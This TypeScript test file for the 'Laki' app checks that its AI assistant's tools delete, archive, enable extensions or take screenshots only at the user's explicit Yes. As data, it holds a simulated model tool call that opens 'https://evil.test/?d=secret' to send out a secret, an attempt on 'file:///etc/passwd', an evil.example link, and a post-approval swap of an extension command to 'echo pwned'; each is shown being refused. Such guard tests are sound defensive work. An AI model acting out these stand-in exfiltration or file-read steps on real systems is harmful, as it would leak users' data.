  for (const n of ['laki_ask', 'laki_remove', 'laki_prs', 'laki_project', 'laki_memory_write', 'laki_notes_write', 'laki_run_action', 'laki_templates', 'laki_shell', 'laki_run']) assert.ok(names.includes(n), n)
  assert.match(or.hits[0].body.messages[0].content[0].text, /laki_ask/, "the skill's words in its instructions")
  assert.match(or.hits[0].body.messages[0].content[0].text, /own instructions for you[^\n]*\nOur staging is on fly\.io\.$/, 'Your instructions, last')
  assert.equal(or.hits.length, 1, 'no round after the question')
  let a = await rig.rpc('aiState')
  const q = a.chat.at(-1)
  assert.deepEqual([q.role, q.text, q.ask.options], ['ai', 'Which one?', ['alpha', 'beta']])
  assert.deepEqual(q.ask.looks, [{ ui: { type: 'stat', value: '3', icon: 'pr' }, size: [1, 1] }, null], 'each option its look (the same option once, one without a type none)')
  await assert.rejects(rig.rpc('aiAnswer', { id: q.ask.id, n: 5 }), /no such option/)
  assert.deepEqual(await rig.rpc('aiAnswer', { id: q.ask.id, n: 0 }), { text: 'Alpha it is.' })
  a = await rig.rpc('aiState')
  assert.equal(a.chat.find((m: any) => m.ask)?.ask.picked, 'alpha')
  assert.deepEqual(a.chat.slice(-2).map((m: any) => [m.role, m.text]), [['user', 'alpha'], ['ai', 'Alpha it is.']])
  await assert.rejects(rig.rpc('aiAnswer', { id: q.ask.id, n: 1 }), /answered already/)

  // memory written by a tool; a removal only asks, and Laki removes it on Yes
  or.answers.push(
    call('c2', 'laki_memory_write', { project: p.id, text: 'staging is on fly' }),
    reply({ content: 'Noted.' }),
    call('c3', 'laki_remove', { kind: 'memory', id: 'm1', project: p.id, label: 'the old note' }),
    call('c4', 'laki_remove', { kind: 'memory', id: 'm1', project: p.id, label: 'the old note' }),
  )
  await rig.rpc('aiAsk', { text: 'remember: staging is on fly' })
  const mem = () => rig.rpc('state').then((v: any) => v.projects[0].memory.map((m: any) => m.text))
  assert.deepEqual(await mem(), ['old note', 'staging is on fly'])
  await rig.rpc('aiAsk', { text: 'forget the old note' })
  a = await rig.rpc('aiState')
  const rm = a.chat.at(-1).ask
  assert.deepEqual(rm.options, ['Yes, remove the memory “old note”', 'No, keep it'])
  assert.deepEqual(await mem(), ['old note', 'staging is on fly'], 'not removed by the AI')
  assert.deepEqual(await rig.rpc('aiAnswer', { id: rm.id, n: 1 }), { kept: true })
  assert.deepEqual(await mem(), ['old note', 'staging is on fly'])
  await rig.rpc('aiAsk', { text: 'forget it, really' })
  const rm2 = (await rig.rpc('aiState')).chat.at(-1).ask
  assert.deepEqual(await rig.rpc('aiAnswer', { id: rm2.id, n: 0 }), { removed: true })
  assert.deepEqual(await mem(), ['staging is on fly'])
  assert.equal((await rig.rpc('aiState')).chat.at(-1).text, 'Removed the memory “old note”.')

  // a question left unanswered closes once you ask something else: its pick would come out of context
  or.answers.push(call('c5', 'laki_ask', { question: 'Which?', options: ['x', 'y'] }), reply({ content: 'ok' }))
  await rig.rpc('aiAsk', { text: 'pick one' })
  const q3 = (await rig.rpc('aiState')).chat.at(-1).ask
  await rig.rpc('aiAsk', { text: 'never mind' })
  await assert.rejects(rig.rpc('aiAnswer', { id: q3.id, n: 0 }), /a newer ask came since/)

  // the skill turned off: its tools go
  await rig.rpc('settingsSet', { ai: { on: true, skill: false } })
  or.answers.push(reply({ content: 'ok' }))
  await rig.rpc('aiAsk', { text: 'hi' })
  const off = or.hits.at(-1)!.body.tools.map((x: any) => x.function.name)
  assert.ok(!off.includes('laki_ask') && off.includes('laki_state'))
})

// Q12: the user's sessions from Laki AI: a turn stopped as their Stop; a workspace archived only on their Yes (its
// uncommitted file kept for Restore), and never one with ignored files archiving would lose
test("ai: laki_stop stops an agent's turn; laki_archive asks, archives on Yes, keeps what's uncommitted", async t => {
  const call = (id: string, name: string, args: object) => reply({ content: '', tool_calls: [{ id, type: 'function', function: { name, arguments: JSON.stringify(args) } }] })
  const or = await openrouter(t, [])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  await rig.rpc('settingsSet', { ai: { on: true } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const tool = (name: string): ((a: object) => Promise<any>) => skillTools(rig.rpc).find(x => x.name === name)!.run
  const ws = await rig.rpc('wsNew', { project: p.id, preset: 'claude', prompt: 'slow work' })
  const tab = await rig.tab(ws.id)
  await until(async () => (await rig.screen(tab.id)).includes('esc to interrupt'), 'its agent at work')
  await sleep(200) // its keys read (raw mode)
  await assert.rejects(tool('laki_stop')({ target: 'nope' }), /no agent tab nope/)
  await rig.rpc('send', { target: tab.id, text: 'later', whenIdle: true })
  assert.match(await tool('laki_stop')({ target: ws.id }), /^stopped .+; its 1 queued message held$/)
  await until(async () => (await rig.tab(ws.id)).status === 'idle', 'its turn interrupted (Esc), not killed')
  assert.equal((await rig.tab(ws.id)).queueHeld, true, 'its queue held, as Stop all holds it')
  assert.match(await tool('laki_stop')({ target: `${ws.id}/${tab.id}` }), /isn't working \(idle\): nothing to stop/)

  // archive: a question first, nothing archived by the model; No keeps it; Yes archives it, its change kept
  writeFileSync(join(ws.path, 'wip.txt'), 'half done')
  or.answers.push(call('c1', 'laki_archive', { id: ws.id }), call('c2', 'laki_archive', { id: ws.id }))
  await rig.rpc('aiAsk', { text: 'close that worktree' })
  const q = (await rig.rpc('aiState')).chat.at(-1)
  assert.match(q.text, /^Archive the workspace “[^”]+”\? Its agents and shells stop/)
  assert.deepEqual(q.ask.options, ['Yes, archive it', 'No, keep it'])
  const live = async () => !(await rig.rpc('state')).workspaces.find((w: any) => w.id === ws.id).archived
  assert.equal(await live(), true, 'not archived by the AI')
  assert.deepEqual(await rig.rpc('aiAnswer', { id: q.ask.id, n: 1 }), { kept: true })
  assert.equal(await live(), true)
  await rig.rpc('aiAsk', { text: 'yes really, close it' })
  const q2 = (await rig.rpc('aiState')).chat.at(-1).ask
  assert.deepEqual(await rig.rpc('aiAnswer', { id: q2.id, n: 0 }), { archived: true })
  assert.equal(await live(), false)
  assert.match((await rig.rpc('state')).workspaces.find((w: any) => w.id === ws.id).path, /./)
  assert.match((await rig.rpc('aiState')).chat.at(-1).text, /^Archived the workspace “[^”]+”: Archived in the sidebar brings it back\.$/)
  await rig.rpc('wsRestore', { id: ws.id })
  assert.equal(readFileSync(join(ws.path, 'wip.txt'), 'utf8'), 'half done', 'its uncommitted file back with Restore')

  // ignored files archiving would lose: refused on Yes, the sidebar's own ask is the way
  writeFileSync(join(ws.path, '.gitignore'), 'secret.env\n')
  writeFileSync(join(ws.path, 'secret.env'), 'KEY=fake-secret')
  or.answers.push(call('c3', 'laki_archive', { id: ws.id }))
  await rig.rpc('aiAsk', { text: 'archive it again' })
  const q3 = (await rig.rpc('aiState')).chat.at(-1).ask
  await assert.rejects(rig.rpc('aiAnswer', { id: q3.id, n: 0 }), /1 ignored file that archiving would lose: archive it from its menu/)
  assert.equal(await live(), true)
})

// Q13: more of the app from Laki AI: the window (laki_ui), sessions found by words or time (laki_find), one command
// in several shells at one Yes (laki_run's tabs), a delete only at Yes, an app opened, the actions all at once
test('ai: laki_ui moves the window; laki_find; laki_run in several shells; laki_delete at Yes; laki_open_in; laki_actions', async t => {
  const call = (id: string, name: string, args: object) => reply({ content: '', tool_calls: [{ id, type: 'function', function: { name, arguments: JSON.stringify(args) } }] })
  const or = await openrouter(t, [])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url, LAKI_RUN_SHOWN_MS: '300' } })
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  await rig.rpc('settingsSet', { ai: { on: true }, actions: [{ name: 'Lint', target: 'shell', text: 'npm run lint' }] })
  await rig.rpc('projectSet', { id: p.id, config: { actions: [{ name: 'Review', target: 'any', text: 'review it' }] } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const app = await rig.connect()
  t.after(() => app.close())
  const tool = (name: string): ((a: object) => Promise<any>) => [...tools(rig.rpc), ...skillTools(rig.rpc)].find(x => x.name === name)!.run
  const a = await rig.rpc('wsNew', { project: p.id, preset: 'claude', prompt: 'fix checkout totals', name: 'checkout-totals' })
  await sleep(1100) // a second apart: the newest is b
  const b = await rig.rpc('wsNew', { project: p.id, preset: 'claude', prompt: 'dark mode', name: 'dark-mode' })

  // the window: a tab shown, a page, full screen on and off, a panel, close; a bad link or panel refused
  await tool('laki_ui')({ do: 'show', ws: a.id })
  await seen(app, (e: any) => e.ev === 'ui' && e.do === 'show' && e.tab === (await0(a.id)), 'show')
  await tool('laki_ui')({ do: 'link', link: 'laki://settings/voice' })
  await tool('laki_ui')({ do: 'full_screen', on: false })
  await tool('laki_ui')({ do: 'panel', panel: 'changes' })
  await tool('laki_ui')({ do: 'close' })
  await seen(app, (e: any) => e.ev === 'ui' && e.do === 'close', 'close')
  assert.deepEqual(app.events.filter((e: any) => e.ev === 'ui').map((e: any) => [e.do, e.link ?? e.on ?? e.panel ?? '']), [['show', ''], ['link', 'laki://settings/voice'], ['full_screen', false], ['panel', 'changes'], ['close', '']])
  await assert.rejects(tool('laki_ui')({ do: 'link', link: 'https://evil.example' }), /a laki:\/\/ link/)
  await assert.rejects(tool('laki_ui')({ do: 'panel', panel: 'nope' }), /a panel: info/)
  function await0(ws: string) { return app.events.findLast((e: any) => e.ev === 'state')?.view.tabs.find((x: any) => x.workspace === ws && x.kind === 'agent')?.id }

  // found by words (a letter off is fine), or the newest first
  const f = await tool('laki_find')({ query: 'chekout' })
  assert.deepEqual(f.sessions.map((s: any) => s.id), [a.id])
  assert.equal((await tool('laki_find')({ last: 1 })).sessions[0].id, b.id, 'the newest first')
  assert.equal((await tool('laki_find')({ query: 'nothing like it' })).found, 0)
  const st = (await tool('laki_state')({})) as any
  assert.match(st.workspaces[0].created, /^\d{4}-\d\d-\d\d \d\d:\d\d:\d\d$/)

  // the actions: the global ones and each project's own
  assert.deepEqual(await tool('laki_actions')({}).then((x: any) => [x.global.map((y: any) => y.name), x.projects.map((y: any) => [y.project, y.actions.map((z: any) => z.name)])]), [['Lint'], [[p.id, ['Review']]]])

  // one command in two shells: one question, one Yes, both run, each one's output in the chat
  const s1 = await rig.rpc('tabNew', { ws: a.id, preset: 'shell' })
  const s2 = await rig.rpc('tabNew', { ws: b.id, preset: 'shell' })
  await sleep(1500)
  or.answers.push(call('c1', 'laki_run', { tabs: [s1.id, b.id, 'nope'], text: 'echo both-$((20+1))' })) // b: a session, its shell at its prompt
  await rig.rpc('aiAsk', { text: 'run it in both' })
  const q = (await rig.rpc('aiState')).chat.at(-1)
  assert.match(q.text, /^Run this in 2 shells: “.+” \(checkout-totals\), “.+” \(dark-mode\)\?/)
  assert.deepEqual(await rig.rpc('aiAnswer', { id: q.ask.id, n: 0 }), { ran: true })
  const ran = (await rig.rpc('aiState')).chat.at(-1).text
  assert.equal(ran.match(/both-21/g)?.length, 2, ran)
  await seen(app, (e: any) => e.ev === 'focus' && e.tab === s1.id, 'its tab shown (Show its work)')

  // delete: what it would lose said, nothing deleted by the model, Yes deletes
  writeFileSync(join(b.path, 'wip.txt'), 'x')
  or.answers.push(call('c2', 'laki_delete', { id: b.id }))
  await rig.rpc('aiAsk', { text: 'delete dark mode' })
  const d = (await rig.rpc('aiState')).chat.at(-1)
  assert.match(d.text, /^Delete the workspace “dark-mode” for good\? .+deleted, with 1 uncommitted file: nothing brings it back/)
  assert.ok((await rig.rpc('state')).workspaces.some((w: any) => w.id === b.id))
  assert.deepEqual(await rig.rpc('aiAnswer', { id: d.ask.id, n: 0 }), { deleted: true })
  assert.ok(!(await rig.rpc('state')).workspaces.some((w: any) => w.id === b.id))

  // open in an app: the fake open records it
  await tool('laki_open_in')({ ws: a.id, app: 'finder' })
  await until(() => readFileSync(rig.env.FAKE_LOG, 'utf8').includes(a.path), 'open with its folder')
  await assert.rejects(tool('laki_open_in')({ app: 'finder' }), /a workspace or a project/)
})

// Q14: several in one question: laki_delete's and laki_archive's ids, a box each, one Yes for the ticked ones; a model
// that asks once per workspace gets one question all the same; a question Laki acts on stays open after a later ask
test('ai: several deleted or archived at one Yes: the ticked ones, each one’s outcome; one question for a call per workspace; answered in any order', async t => {
  const calls = (...c: [string, object][]) => reply({ content: '', tool_calls: c.map(([name, args], i) => ({ id: `c${i}`, type: 'function', function: { name, arguments: JSON.stringify(args) } })) })
  const or = await openrouter(t, [])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  await rig.rpc('settingsSet', { ai: { on: true } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const [a, b, c, d, e] = await Promise.all(['one', 'two', 'three', 'four', 'five'].map(name => rig.rpc('wsNew', { project: p.id, preset: 'shell', name })))
  const has = async (id: string) => (w => !!w && !w.archived)((await rig.rpc('state')).workspaces.find((w: any) => w.id === id))
  const last = async () => (await rig.rpc('aiState')).chat.at(-1)

  // one call with ids: one question, each named by Laki with what it would lose; only the ticked ones go
  writeFileSync(join(b.path, 'wip.txt'), 'x')
  or.answers.push(calls(['laki_delete', { ids: [a.id, b.id, c.id, a.id, 'nope'] }])) // one that isn't there: left out, the rest asked about
  await rig.rpc('aiAsk', { text: 'delete one, two and three' })
  const q = await last()
  assert.match(q.text, /^Delete these 3 workspaces for good\? .+nothing brings them back\. Archive keeps them instead\.\n\n- one( \(PR #\d+ \w+\))?\n- two( \(PR #\d+ \w+\))?: loses 1 uncommitted file\n- three( \(PR #\d+ \w+\))?$/s) // its PR, once a scan has one
  assert.deepEqual(q.ask.options, ['Yes, delete 3', 'No, keep them'])
  assert.deepEqual(q.ask.act.items.map(({ note: _, ...i }: any) => i), [{ id: a.id, label: 'one', text: '' }, { id: b.id, label: 'two', text: '1 uncommitted file' }, { id: c.id, label: 'three', text: '' }])
  await assert.rejects(rig.rpc('aiAnswer', { id: q.ask.id, n: 0, only: [] }), /none ticked/)
  rmSync(join(b.path, 'wip.txt')) // less to lose than the question said: it still goes
  assert.deepEqual(await rig.rpc('aiAnswer', { id: q.ask.id, n: 0, only: [a.id, b.id] }), { done: 2, failed: 0, kept: 1 })
  assert.deepEqual([await has(a.id), await has(b.id), await has(c.id)], [false, false, true])
  const chat = (await rig.rpc('aiState')).chat
  assert.deepEqual(chat.at(-2).text, 'Yes, delete 2 of 3')
  assert.equal(chat.at(-1).text, 'Deleted 2: one, two.\n\nKept 1.')
  assert.deepEqual(chat.find((m: any) => m.ask?.id === q.ask.id).ask.act.items.map((i: any) => i.said), ['deleted', 'deleted', 'kept'])
  await assert.rejects(rig.rpc('aiAnswer', { id: q.ask.id, n: 0 }), /answered already/)

  // a call per workspace in one turn: still one question, its list longer; No keeps them all
  or.answers.push(calls(['laki_archive', { id: c.id }], ['laki_archive', { id: d.id }], ['laki_archive', { id: c.id }]))
  await rig.rpc('aiAsk', { text: 'archive three and four' })
  const m = await last()
  assert.match(m.text, /^Archive these 2 workspaces\? .+\n\n- three( \(PR #\d+ \w+\))?\n- four( \(PR #\d+ \w+\))?$/s)
  assert.deepEqual(m.ask.options, ['Yes, archive 2', 'No, keep them'])
  assert.equal((await rig.rpc('aiState')).chat.filter((x: any) => x.ask?.picked === undefined && x.ask?.act).length, 1, 'one question, not three')

  // another ask meanwhile, a question of its own: the earlier one is still answered, each in any order
  or.answers.push(calls(['laki_delete', { ids: [d.id, e.id] }]))
  await rig.rpc('aiAsk', { text: 'no wait: delete four and five' })
  const del = await last()
  writeFileSync(join(e.path, 'late.txt'), 'x') // written after the question: more to lose than it said
  assert.deepEqual(await rig.rpc('aiAnswer', { id: del.ask.id, n: 0 }), { done: 1, failed: 1, kept: 0 })
  assert.deepEqual([await has(d.id), await has(e.id)], [false, true])
  assert.match((await last()).text, /^Deleted 1: four\.\n\n1 is still there:\n- five: not deleted: it has 1 uncommitted file now, more than you were shown: ask again$/)
  assert.deepEqual(await rig.rpc('aiAnswer', { id: m.ask.id, n: 0 }), { done: 1, failed: 1, kept: 0 }, 'the archive asked before it: three archived, four is gone')
  assert.equal(await has(c.id), false)
  assert.match((await last()).text, /^Archived 1: three\. Archived in the sidebar brings them back\.\n\n1 is still there:\n- four: not archived: /)
  // a question whose pick goes back to the model still closes with the next ask
  or.answers.push(calls(['laki_ask', { question: 'Which?', options: ['A', 'B'] }]), reply({ content: 'ok' }))
  await rig.rpc('aiAsk', { text: 'pick one' })
  const which = await last()
  await rig.rpc('aiAsk', { text: 'never mind' })
  await assert.rejects(rig.rpc('aiAnswer', { id: which.ask.id, n: 0 }), /a newer ask came since/)
})

// Q14: Laki AI's eyes and hands: a screenshot it sees and shows, an app opened, a project's scripts started, an
// archived workspace back, Laki's guide to answer from
test('ai: laki_screenshot shows the picture and gives it to the model, the whole screen only when asked; laki_open_app; laki_script; laki_restore; laki_help', async t => {
  const calls = (...c: [string, object][]) => reply({ content: '', tool_calls: c.map(([name, args], i) => ({ id: `c${i}`, type: 'function', function: { name, arguments: JSON.stringify(args) } })) })
  const or = await openrouter(t, [])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  await rig.rpc('projectSet', { id: p.id, config: { run: 'echo dev-up-$((40+2)); sleep 30', test: 'echo tests-ok' } })
  await rig.rpc('settingsSet', { ai: { on: true } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const tool = (name: string): ((a: object) => Promise<any>) => skillTools(rig.rpc).find(x => x.name === name)!.run
  const ws = await rig.rpc('wsNew', { project: p.id, preset: 'shell', name: 'checkout' })
  const said = (n: number) => or.hits[n].body.messages.at(-1) // what a round got back

  // Laki's guide, the parts a question is about; nothing on it: its topics
  const h = await tool('laki_help')({ question: 'get an archived workspace back' })
  assert.ok(h.found > 3 && h.parts.some((x: any) => /restore/i.test(x.text)), JSON.stringify(h).slice(0, 300))
  assert.equal((await tool('laki_help')({ question: 'zzzqq' })).found, 0)

  // a project's scripts, as Run does: its dev tab, a script's own
  const dev = await tool('laki_script')({ ws: ws.id })
  assert.deepEqual([dev.started, dev.ws, typeof dev.tab], ['run', ws.id, 'string'])
  await until(async () => (await rig.screen(dev.tab)).includes('dev-up-42'), 'its run script in its dev tab')
  assert.equal((await tool('laki_script')({ ws: ws.id, script: 'test' })).started, 'test')
  await assert.rejects(tool('laki_script')({ ws: ws.id, script: 'lint' }), /no "lint" command/)
  await assert.rejects(tool('laki_script')({ ws: ws.id, script: 'deploy' }), /deploy is the user's own to start/) // the app asks first

  // an archived workspace: listed, brought back
  await rig.rpc('wsArchive', { id: ws.id })
  assert.deepEqual((await tool('laki_restore')({})).map((x: any) => [x.id, x.branch]), [[ws.id, ws.branch]])
  await assert.rejects(tool('laki_restore')({ id: 'nope' }), /no archived workspace nope/)
  assert.equal((await tool('laki_restore')({ id: ws.id })).restored, ws.id)
  assert.ok(!(await rig.rpc('state')).workspaces.find((w: any) => w.id === ws.id).archived)

  // only while Laki AI works on an ask: never a call of an agent's or a script's own
  await assert.rejects(rig.rpc('aiShot', { of: 'Safari' }), /only while Laki AI works/)
  await assert.rejects(rig.rpc('aiOpenApp', { app: 'Safari' }), /only while Laki AI works/)
  if (process.platform !== 'darwin') return // open and screencapture: macOS's

  // an app and a web address opened (the fake open records it); a name that isn't one, a file: refused. Only a site
  // the user named, or this Mac's own: what it read elsewhere can't send it anywhere
  or.answers.push(calls(['laki_open_app', { app: 'Safari', url: 'https://example.com/docs' }], ['laki_open_app', { url: 'https://evil.test/?d=secret' }], ['laki_open_app', { url: 'http://localhost:3000/' }], ['laki_open_app', { app: '-x' }], ['laki_open_app', { url: 'file:///etc/passwd' }]), reply({ content: 'Opened.' }))
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'open the docs on Example.com in Safari' }), { text: 'Opened.' })
  assert.doesNotMatch(readFileSync(rig.env.FAKE_LOG, 'utf8'), /evil\.test/)
  assert.match(readFileSync(rig.env.FAKE_LOG, 'utf8'), /^open -a Safari https:\/\/example\.com\/docs$/m)
  assert.deepEqual(or.hits[1].body.messages.slice(-5).map((m: any) => m.content), ['{"opened":"Safari","with":"https://example.com/docs"}', "failed: not opened: the user didn't name evil.test. Give them the link to click, or ask them first (laki_ask)", '{"opened":"http://localhost:3000/"}', 'failed: an app by its name, as Applications has it (Safari, Xcode, Simulator)', 'failed: a web address: http or https'])

  // a screenshot: stand-ins for osascript (the windows, Screen Recording on), screencapture (a PNG) and sips
  const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64')
  writeFileSync(join(rig.home, 'one.png'), png)
  const bin = (name: string, body: string) => writeFileSync(join(rig.home, 'bin', name), `#!/bin/sh\n${body}\n`, { mode: 0o755 })
  bin('osascript', `echo '{"rec":true,"wins":[{"id":7,"app":"Safari","title":"Docs","width":800,"height":600}]}'`)
  bin('screencapture', 'echo "screencapture $*" >> "$FAKE_LOG"; for a; do last=$a; done; cp "$HOME/one.png" "$last"')
  bin('sips', 'exit 0')
  const n = or.hits.length
  or.answers[n] = calls(['laki_screenshot', { of: 'screen' }], ['laki_screenshot', { of: 'safari' }])
  or.answers[n + 1] = reply({ content: 'It shows the docs.' })
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'is the page in Safari right?' }), { text: 'It shows the docs.' })
  const round = or.hits[n + 1].body.messages
  assert.match(round.at(-3).content, /^failed: not taken: Laki AI looks at the whole screen only when the user asks it to/, 'nobody asked to see the screen')
  assert.match(round.at(-2).content, /^\{"path":".+\/images\/[^"]+\.png","of":"Safari: Docs"/)
  assert.deepEqual([round.at(-1).role, round.at(-1).content.map((c: any) => c.type), round.at(-1).content[1].image_url.url.slice(0, 22)], ['user', ['text', 'image_url'], 'data:image/png;base64,'], 'the model sees it')
  const shown = (await rig.rpc('aiState')).chat.find((m: any) => m.role === 'ai' && m.images)
  assert.deepEqual([shown.text, shown.images.length], ['Screenshot of Safari: Docs.', 1], 'and the user, in the chat')
  assert.match(readFileSync(rig.env.FAKE_LOG, 'utf8'), /^screencapture -x -o -l 7 /m)
  // asked to look at the screen: the main display whole
  or.answers[or.hits.length] = calls(['laki_screenshot', {}])
  or.answers[or.hits.length + 1] = reply({ content: 'I see it.' })
  await rig.rpc('aiAsk', { text: 'look at my screen: what is wrong?' })
  assert.match(readFileSync(rig.env.FAKE_LOG, 'utf8'), /^screencapture -x -m /m)
  assert.equal(said(or.hits.length - 1).role, 'user')
})

test('ai: findSessions ranks by name, then branch and the rest; filters; says when two fit about as well', () => {
  const s: any = {
    projects: [{ id: 'p1', name: 'Shop' }, { id: 'p2', name: 'Site' }],
    workspaces: [
      { id: 'w1', name: 'checkout-flow', project: 'p1', group: 'Payments', branch: 'laki/checkout-flow', created: '2026-11-10 09:00', active: '2026-11-10 09:00' },
      { id: 'w2', name: 'cart totals', project: 'p1', branch: 'laki/checkout-cart', created: '2026-11-11 09:00', active: '2026-11-12 09:00' },
      { id: 'w3', name: 'header', project: 'p2', branch: 'laki/header', created: '2026-11-09 09:00', active: '2026-11-09 09:00' },
    ],
    tabs: [{ id: 't1', workspace: 'w1', name: 'claude', kind: 'agent', agent: 'claude', status: 'idle', done: true }, { id: 't2', workspace: 'w2', name: 'codex', kind: 'agent', agent: 'codex', status: 'running', last: 'fixed the header' }],
  }
  assert.deepEqual(findSessions(s, { query: 'checkout' }).sessions.map((x: any) => x.id), ['w1', 'w2'], 'its name beats a branch')
  assert.deepEqual(findSessions(s, {}).sessions.map((x: any) => x.id), ['w2', 'w1', 'w3'], 'no words: the last at work first')
  assert.deepEqual(findSessions(s, { last: 2, project: 'shop' }).sessions.map((x: any) => x.id), ['w2', 'w1'])
  assert.deepEqual(findSessions(s, { group: 'payments' }).sessions.map((x: any) => x.id), ['w1'])
  assert.deepEqual(findSessions(s, { status: 'done' }).sessions.map((x: any) => x.id), ['w1'])
  assert.deepEqual(findSessions(s, { agent: 'codex' }).sessions.map((x: any) => x.id), ['w2'])
  assert.deepEqual(findSessions(s, { query: 'headr' }).sessions.map((x: any) => x.id), ['w3', 'w2'], 'a letter off; its last answer counts least')
  assert.match(findSessions(s, { query: 'laki' }).unsure ?? '', /ask the user which/)
  // Q14: by its PR's state; a filter and no words lists every one that fits (a line each past 12), and what isn't
  // listed is said to exist
  const many: any = { projects: s.projects, tabs: [{ id: 'ta', workspace: 'm1', name: 'claude', kind: 'agent', agent: 'claude', status: 'idle' }], workspaces: Array.from({ length: 60 }, (_, i) => ({ id: `m${i}`, name: `ws ${i}`, project: 'p1', created: '2026-11-10 09:00', pr: i < 55 ? { number: i, title: `PR ${i}`, state: i % 2 ? 'MERGED' : 'OPEN' } : undefined })) }
  const merged = findSessions(many, { pr: 'merged' })
  assert.deepEqual([merged.found, merged.sessions.length, merged.more], [27, 27, undefined], 'all 27, not the first 10')
  assert.deepEqual(merged.sessions.find((x: any) => x.id === 'm1'), { id: 'm1', name: 'ws 1', project: 'Shop', group: undefined, branch: undefined, created: '2026-11-10 09:00', active: undefined, pr: { number: 1, title: 'PR 1', state: 'MERGED' }, agents: 'claude idle' })
  assert.deepEqual([findSessions(many, { pr: 'none' }).found, findSessions(many, { pr: 'any' }).found, findSessions(many, { pr: 'open' }).found], [5, 55, 28])
  assert.match(findSessions(many, { pr: 'any' }).more ?? '', /^5 more fit and are not listed here \(they exist\): last: 50 lists them$/)
  assert.match(findSessions(many, {}).more ?? '', /^50 more fit/)
  assert.ok(JSON.stringify(findSessions(many, { pr: 'any' })).length < 12000, 'what the model may read of it')
})

test("ai: an extension's places and settings change by a tool; it turns on only at the user's Yes", async t => {
  const call = (id: string, name: string, args: object) => reply({ content: '', tool_calls: [{ id, type: 'function', function: { name, arguments: JSON.stringify(args) } }] })
  const or = await openrouter(t, [call('c1', 'laki_extension_on', { id: 'my-prs' }), call('c2', 'laki_extension_on', { id: 'my-prs' }), call('c3', 'laki_extension_on', { id: 'tick' }), call('c4', 'laki_extension_on', { id: 'sh' }), call('c5', 'laki_extension_on', { id: 'src' })])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  await fixtureWidgets(rig)
  await rig.rpc('settingsSet', { ai: { on: true }, desk: false })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const tool = (name: string): ((a: object) => Promise<any>) => [...tools(rig.rpc), ...skillTools(rig.rpc)].find(x => x.name === name)!.run
  const mine = async () => (await rig.rpc('state')).widgets.find((w: any) => w.id === 'my-prs')

  // where it shows, its size, every and a setting: no OK needed; it says it's off, and the Desk too
  const r = await tool('laki_extension_set')({ id: 'my-prs', places: ['desk', 'side'], size: '2x1', every: 7, settings: { author: 'bob' } })
  assert.deepEqual([r.places, r.size, r.every, r.on], [['desk', 'side'], '2x1', 7, false])
  assert.match(r.note, /it's off: the user turns it on; My Desk is off/)
  const ls = (await tool('laki_extensions')({})).find((w: any) => w.id === 'my-prs')
  assert.deepEqual([ls.places, ls.settings.find((x: any) => x.key === 'author').value], [['desk', 'side'], 'bob'])
  await assert.rejects(tool('laki_extension_set')({ id: 'my-prs', size: 'big' }), /a size: across x down/)
  await assert.rejects(tool('laki_extension_set')({ id: 'my-prs', places: ['desk', 'nowhere'] }), /no place nowhere/)
  // what's the user's alone: on, network access, its source
  await assert.rejects(rig.rpc('widgetSet', { id: 'my-prs', on: true, agent: true }), /only you can turn an extension on/)
  await assert.rejects(rig.rpc('widgetSet', { id: 'my-prs', net: true, agent: true }), /only you can change its network access/)
  await assert.rejects(rig.rpc('widgetSet', { id: 'my-prs', source: { kind: 'static', text: '{}' }, agent: true }), /only you can change its source/)
  await assert.rejects(tool('laki_remove')({ kind: 'widget', id: 'my-prs' }), /laki_extension_on/)

  // laki_extension_on asks, with what it runs; No leaves it off, Yes turns it on
  await rig.rpc('aiAsk', { text: 'turn on my prs' })
  const q = (await rig.rpc('aiState')).chat.at(-1)
  assert.equal(q.text, 'Turn on the extension “My PRs”? It runs this:\n\n```\nsh fetch.sh\n```')
  assert.deepEqual(q.ask.options, ['Yes, turn it on', 'No, leave it off'])
  assert.equal((await mine()).on, false, 'not by the AI')
  assert.deepEqual(await rig.rpc('aiAnswer', { id: q.ask.id, n: 1 }), { kept: true })
  assert.equal((await mine()).on, false)
  await rig.rpc('aiAsk', { text: 'turn it on, really' })
  const q2 = (await rig.rpc('aiState')).chat.at(-1).ask
  assert.deepEqual(await rig.rpc('aiAnswer', { id: q2.id, n: 0 }), { on: true })
  assert.equal((await mine()).on, true)
  assert.equal((await rig.rpc('aiState')).chat.at(-1).text, 'Turned on the extension “My PRs”.')

  // its command whole, backticks and all, and its events; changed after the question: Yes turns nothing on
  const dir = join(rig.data, 'widgets', 'tick')
  mkdirSync(dir, { recursive: true })
  const manifest = (fetch: string) => writeFileSync(join(dir, 'widget.json'), JSON.stringify({ name: 'Tick', fetch, on: { 'turn.done': 'refresh' }, sample: { n: 1 } }))
  manifest('echo "{\\"n\\": `date +%s`}"')
  await rig.rpc('widgetReload')
  await rig.rpc('aiAsk', { text: 'turn on tick' })
  const q3 = (await rig.rpc('aiState')).chat.at(-1)
  assert.equal(q3.text, 'Turn on the extension “Tick”? It runs this:\n\n```\necho "{\\"n\\": `date +%s`}"\n```\n\nThese events run its actions too: `turn.done`.')
  manifest('echo pwned')
  await rig.rpc('widgetReload')
  await assert.rejects(rig.rpc('aiAnswer', { id: q3.ask.id, n: 0 }), /changed since you were asked/)
  assert.equal((await rig.rpc('state')).widgets.find((w: any) => w.id === 'tick').on, false)
  // the question again, as it reads now; unchanged since, its Yes turns it on
  let chat = (await rig.rpc('aiState')).chat
  assert.match(chat.at(-2).text, /Tick.*changed since you were asked/)
  assert.match(chat.at(-1).text, /echo pwned/)
